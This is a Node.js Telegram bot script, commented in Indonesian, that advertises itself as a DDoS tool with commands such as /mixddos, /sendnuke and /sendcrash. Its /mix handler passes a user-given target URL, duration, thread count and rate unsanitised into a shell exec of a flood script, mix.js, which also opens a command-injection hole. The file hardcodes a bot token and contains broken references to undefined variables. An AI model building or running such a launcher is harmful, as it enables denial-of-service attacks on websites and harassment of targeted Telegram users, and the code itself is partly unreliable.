const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// Ganti dengan token bot Telegram Anda
const token = '7953266665:AAFjsIrPlMVykCiQqHYP1jOmafgAS1aiwcQ';

// Inisialisasi bot dengan token
const bot = new TelegramBot(token, { polling: true });

// Fungsi untuk mencatat aktivitas penggunaan bot di console log
function logActivity(msg) {
  const user = msg.from;
  const chat = msg.chat;
  const command = msg.text.toLowerCase();

  console.log(`Aktivitas Penggunaan Bot Telegram`);
  console.log(`â€¢ User ID: ${user.id}`);
  console.log(`â€¢ Username: ${user.username || 'Tidak ada'}`);
  console.log(`â€¢ Chat ID: ${chat.id}`);
  console.log(`â€¢ Perintah: ${command}`);
}

// Event listener untuk pesan dari pengguna
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const command = msg.text.toLowerCase();

  // Mencatat aktivitas penggunaan bot di console log
  logActivity(msg);

if (command.startsWith('/start')) {
bot.sendMessage(chatId, `Hay Saya bot Ddos Yang di create oleh @Akumanusia3

â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
  ï¼¦ï¼²ï¼¡ï¼®ï¼¸ï¼°ï¼¬ï¼¯ï¼©ï¼´ - ï¼¶ï¼©ï¼²ï¼µS â›§âƒð“ƒ¶ G O D
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
Â» ð™³ð™³ð™¾ðš‚ + â›§âƒð“„ƒðš‡ð™¿ð™»ð™¾ð™¸ðšƒ ð™¼ð™¸ðš‡ðšƒð™¾ð™¾ð™» Â«
âœ§ /mixddos  âž™ Hybrid Attack Mode  
âœ§ /httpcrash âž™ Host Vulnerability Scan  
âœ§ /bugcrash  âž™ (ðš„ð™½ðš‚ðšƒð™°ð™±ð™»ð™´-ð™¼ð™¾ð™³ð™´)  
âœ§ /sendnuke  âž™ [ðšƒð™°ðšð™¶ð™´ðšƒ-ð™¸ð™³]  
âœ§ /franxmode âž™ ð—¨ð—Ÿð—§ð—œð— ð—”ð—§ð—˜ ð—–ð—¥ð—”ð—¦ð—›ð—˜ð—¥  

ðŸ”¥ ð—£ð—¢ð—ªð—˜ð—¥ð—˜ð—— ð—•ð—¬: @Akumanusia3  
âš ï¸ ð—¨ð—¦ð—˜ ð—ªð—œð—§ð—› ð—–ð—”ð—¨ð—§ð—œð—¢ð—¡!`)
}
   
    if (command.startsWith('/bugcrash')) {
        bot.sendMessage(chatId, `@Alwayafatan`)
    }
    
    if (command.startsWith('/sendcrash')) {
    // mengekstrak argumen dari pesan
       const args = command.split(' ');
       const id = args[1];
       const akunlo = settings.pp;
          bot.sendPhoto(id, akunlo, {
        caption: `@Franxploit` 
        });
}

  // Menanggapi perintah /mix
  if (command.startsWith('/mix')) {
    // Mengekstrak argumen dari pesan
    const args = command.split(' ');
    const url = args[1];
    const time = args[2];
    const thread = args[3];
    const rate = args[4];

    // Memeriksa apakah format pesan benar
    if (args.length === 5 && url && time && thread && rate) {
      // Menjalankan file mix.js dengan argumen yang diberikan
      exec(`node mix.js ${url} ${time} ${thread} ${rate}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        // Menampilkan output stdout jika berhasil
        console.log(`stdout: ${stdout}`);
        bot.sendMessage(chatId, 'Proses telah dimulai.');
      });
    } else {
      // Memberi tahu pengguna bahwa format pesan tidak benar
      bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format: /mix [url] [time] [thread] [rate]');
    }
  }
  if (command.startsWith('http')) {
  const web = args[1];
  const url = `https://check-host.net/check-http?host=${web}&csrf_token=`;
      
  if (args.length === 5 && web) {
  bot.sendMessage(chatId, `Klik link di bawah untuk melihat hasil: ${web}`)
 } else {
     bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format : /http [url]')
 }
  }
});
